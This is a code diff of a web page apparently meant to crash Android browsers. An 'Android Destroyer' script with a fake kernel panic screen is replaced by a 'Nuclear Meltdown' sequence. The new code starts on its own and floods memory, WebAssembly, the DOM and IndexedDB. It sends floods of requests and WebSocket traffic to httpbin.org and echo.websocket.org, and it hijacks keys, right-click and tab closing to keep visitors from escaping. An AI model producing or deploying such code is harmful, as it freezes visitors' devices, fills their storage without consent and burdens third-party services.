-                        const arr = new Array(100000);
-                        return crashRecursive(depth + 1) + arr.length;
-                    };
-                    crashRecursive(0);
-                } catch (e) {}
-                
-                // 3. WebGL out of memory
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const buffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    gl.bufferData(gl.ARRAY_BUFFER, new ArrayBuffer(1024 * 1024 * 1024), gl.STATIC_DRAW); // 1GB
-                } catch (e) {}
-            }
-
-            maximumDestruction() {
-                console.log("[DESTROYER] MAXIMUM DESTRUCTION ACTIVATED");
-                
-                // Try to trigger kernel panic simulation
-                const panic = () => {
-                    document.body.innerHTML = '';
-                    document.body.style.background = '#000';
-                    document.body.innerHTML = `
-                        <div style="
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 100%;
-                            background: #000;
-                            color: #f00;
-                            font-family: monospace;
-                            padding: 20px;
-                            font-size: 24px;
-                        ">
-                        <pre>
-KERNEL PANIC - NOT SYNCING: FATAL EXCEPTION
-CPU: 7 PID: 0 Comm: swapper/7
-Hardware name: Qualcomm Technologies, Inc.
-Unable to handle kernel NULL pointer dereference
-Internal error: Oops: 96000005 [#1] PREEMPT SMP
-PC is at 0xffffffc000a8b6c4
-LR is at 0xffffffc000a8b6c0
-Call trace:
-[<ffffffc000a8b6c4>] 0xffffffc000a8b6c4
-[<ffffffc000a8b6c0>] 0xffffffc000a8b6c0
----[ end trace 0000000000000000 ]---
-Kernel panic - not syncing: Fatal exception
-                        </pre>
-                        </div>
-                    `;
-                    
-                    // Force a reload that will likely fail
-                    setTimeout(() => {
-                        window.location.href = 'about:blank';
-                        setTimeout(() => {
-                            window.open('about:blank', '_self');
-                            window.close();
-                        }, 100);
-                    }, 5000);
-                };
-                
-                panic();
-            }
-
-            getDeviceInfo() {
-                // Try to detect Android device
-                const userAgent = navigator.userAgent.toLowerCase();
-                let model = "Unknown Android Device";
-                
-                if (userAgent.includes('samsung')) {
-                    model = "Samsung Galaxy Series";
-                } else if (userAgent.includes('xiaomi') || userAgent.includes('redmi')) {
-                    model = "Xiaomi/Redmi Device";
-                } else if (userAgent.includes('oppo')) {
-                    model = "OPPO Device";
-                } else if (userAgent.includes('vivo')) {
-                    model = "vivo Device";
-                } else if (userAgent.includes('huawei') || userAgent.includes('honor')) {
-                    model = "Huawei/Honor Device";
-                } else if (userAgent.includes('oneplus')) {
-                    model = "OnePlus Device";
-                } else if (userAgent.includes('pixel')) {
-                    model = "Google Pixel";
-                }
-                
-                document.getElementById('deviceModel').textContent = model;
-                return model;
+                    const blob = new Blob([workerCode]);
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    workers.push(worker);
+                } catch(e) {}
             }
         }
-
-        // ============================================
-        // START THE DESTRUCTION
-        // ============================================
-
-        // Auto-start after page loads
-        window.addEventListener('load', () => {
-            console.log("[SYSTEM] Android Destroyer v3.0 Initializing...");
-            console.log("[WARNING] This will attempt to damage Android hardware");
+        
+        // Level 4: WebAssembly Memory Bomb
+        function wasmBomb() {
+            log("LEVEL 4: Deploying WebAssembly Memory Bomb...");
             
-            // Show warning
-            alert("⚠️ CRITICAL WARNING ⚠️\n\nThis page will attempt to simulate hardware damage on Android devices.\n\nDO NOT USE ON DEVICES YOU CARE ABOUT!\n\nProceed at your own risk!");
-            
-            // Start destruction
-            setTimeout(() => {
-                const destroyer = new AndroidDestroyer();
-                window.destroyer = destroyer; // Expose for debugging
+            // Create massive WebAssembly memory
+            try {
+                const memory = new WebAssembly.Memory({ 
+                    initial: 65536, // 4GB initial
+                    maximum: 65536 * 10 // 40GB maximum
+                });
                 
-                // Auto-intensify every 30 seconds
-                setInterval(() => {
-                    if (destroyer.isDestroying) {
-                        destroyer.intensifyAttack();
+                // Fill memory
+                const buffer = new Uint8Array(memory.buffer);
+                const fillInterval = setInterval(() => {
+                    for(let i = 0; i < buffer.length; i += 1000) {
+                        buffer[i] = Math.random() * 256;
                     }
-                }, 30000);
+                    totalMemory += 4000; // 4GB per interval
+                    counter.textContent = `MEMORY: ${totalMemory} MB`;
+                }, 100);
                 
-            }, 3000);
-        });
-
-        // Emergency stop (hidden)
-        document.addEventListener('keydown', (e) => {
-            if (e.altKey && e.shiftKey && e.key === 'E') {
-                if (window.destroyer) {
-                    window.destroyer.isDestroying = false;
-                    alert("Destruction stopped. Device may still be damaged.");
-                    location.reload();
+                setTimeout(() => clearInterval(fillInterval), 5000);
+            } catch(e) {}
+        }
+        
+        // Level 5: DOM Apocalypse
+        function domApocalypse() {
+            log("LEVEL 5: Starting DOM Apocalypse...");
+            
+            // Create millions of DOM elements
+            const fragment = document.createDocumentFragment();
+            let elementCount = 0;
+            
+            const createElements = () => {
+                for(let i = 0; i < 10000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = `
+                        <div style="position:absolute;left:${Math.random()*100}vw;top:${Math.random()*100}vh">
+                            ${'💥'.repeat(100)}
+                        </div>
+                    `;
+                    fragment.appendChild(div);
+                    elementCount++;
+                    
+                    if(elementCount % 1000 === 0) {
+                        document.body.appendChild(fragment.cloneNode(true));
+                    }
                 }
+                
+                if(elementCount < 1000000) {
+                    setTimeout(createElements, 0);
+                }
+            };
+            
+            createElements();
+        }
+        
+        // Level 6: Network Flood
+        function networkFlood() {
+            log("LEVEL 6: Initiating Network Flood...");
+            
+            // Flood with fetch requests
+            for(let i = 0; i < 1000; i++) {
+                fetch(`https://httpbin.org/delay/${Math.random() * 10}`)
+                    .catch(() => {});
+                
+                // Create WebSocket connections
+                try {
+                    const ws = new WebSocket('wss://echo.websocket.org');
+                    ws.onopen = () => {
+                        setInterval(() => {
+                            ws.send('X'.repeat(1000000));
+                        }, 100);
+                    };
+                } catch(e) {}
             }
+        }
+        
+        // Level 7: IndexedDB Bomb
+        function indexedDBBomb() {
+            log("LEVEL 7: Deploying IndexedDB Bomb...");
+            
+            for(let i = 0; i < 100; i++) {
+                try {
+                    const request = indexedDB.open(`crashDB_${i}`, 1);
+                    
+                    request.onupgradeneeded = function(event) {
+                        const db = event.target.result;
+                        const store = db.createObjectStore('crash', { keyPath: 'id' });
+                        
+                        // Store huge amounts of data
+                        const transaction = db.transaction(['crash'], 'readwrite');
+                        const objectStore = transaction.objectStore('crash');
+                        
+                        for(let j = 0; j < 10000; j++) {
+                            objectStore.add({
+                                id: j,
+                                data: 'X'.repeat(10000),
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                    };
+                } catch(e) {}
+            }
+        }
+        
+        // Level 8: Final System Meltdown
+        function systemMeltdown() {
+            log("LEVEL 8: FINAL SYSTEM MELTDOWN...");
+            
+            // Combine all methods at once
+            const methods = [
+                () => {
+                    // Infinite loop with eval
+                    eval(`
+                        while(true) {
+                            (function() {
+                                return arguments.callee;
+                            })()();
+                        }
+                    `);
+                },
+                () => {
+                    // Crash with typed arrays
+                    const arrays = [];
+                    while(true) {
+                        arrays.push(new Float64Array(10000000));
+                    }
+                },
+                () => {
+                    // Abuse garbage collector
+                    const garbage = [];
+                    setInterval(() => {
+                        for(let i = 0; i < 1000; i++) {
+                            garbage.push(new Array(1000000));
+                        }
+                        garbage.splice(0, garbage.length / 2);
+                    }, 1);
+                },
+                () => {
+                    // Browser API abuse
+                    for(let i = 0; i < 1000; i++) {
+                        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        analyser = audioContext.createAnalyser();
+                        buffer = audioContext.createBuffer(2, 44100 * 10, 44100);
+                    }
+                }
+            ];
+            
+            // Execute all methods simultaneously
+            methods.forEach(method => {
+                try {
+                    method();
+                } catch(e) {
+                    // Ignore errors
+                }
+            });
+            
+            // Ultimate memory bomb
+            const ultimateBomb = () => {
+                const bomb = [];
+                while(true) {
+                    bomb.push(new ArrayBuffer(1024 * 1024 * 500)); // 500MB chunks
+                    totalMemory += 500;
+                    counter.textContent = `MEMORY: ${totalMemory} MB - SYSTEM FAILURE IMMINENT`;
+                    
+                    if(totalMemory > 10000) {
+                        document.body.innerHTML = `
+                            <div style="
+                                position: fixed;
+                                top: 0;
+                                left: 0;
+                                width: 100%;
+                                height: 100%;
+                                background: #000;
+                                color: #f00;
+                                font-size: 5rem;
+                                display: flex;
+                                align-items: center;
+                                justify-content: center;
+                                text-align: center;
+                            ">
+                                💥 SYSTEM DESTROYED 💥<br>
+                                Browser will crash in 3... 2... 1...
+                            </div>
+                        `;
+                    }
+                }
+            };
+            
+            setTimeout(ultimateBomb, 1000);
+        }
+        
+        // Main function
+        async function startNuclearMeltdown() {
+            log("🚀 NUCLEAR MELTDOWN SEQUENCE INITIATED 🚀");
+            document.getElementById('launchButton').disabled = true;
+            document.getElementById('launchButton').textContent = "💣 MELTDOWN IN PROGRESS 💣";
+            
+            try {
+                await memoryFlood();
+                await stackDestruction();
+                await gpuDestruction();
+                await wasmBomb();
+                await domApocalypse();
+                await networkFlood();
+                await indexedDBBomb();
+                await systemMeltdown();
+            } catch(e) {
+                log(`Error: ${e.message}`);
+            }
+            
+            // Auto-start if no interaction
+            setTimeout(() => {
+                if(totalMemory < 1000) {
+                    startNuclearMeltdown();
+                }
+            }, 5000);
+        }
+        
+        // Auto-start after 10 seconds
+        setTimeout(() => {
+            if(!document.getElementById('launchButton').disabled) {
+                log("AUTO-STARTING MELTDOWN IN 5 SECONDS...");
+                setTimeout(startNuclearMeltdown, 5000);
+            }
+        }, 10000);
+        
+        // Prevent escape
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+            if(e.key === 'Escape' || e.key === 'F5' || e.key === 'F12') {
+                log("ESCAPE ATTEMPT DETECTED - ACCELERATING MELTDOWN");
+                startNuclearMeltdown();
+            }
+        });
+        
+        // Right click prevention
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            startNuclearMeltdown();
+        });
+        
+        // Attempt to close tab
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            startNuclearMeltdown();
         });
     </script>
 </body>
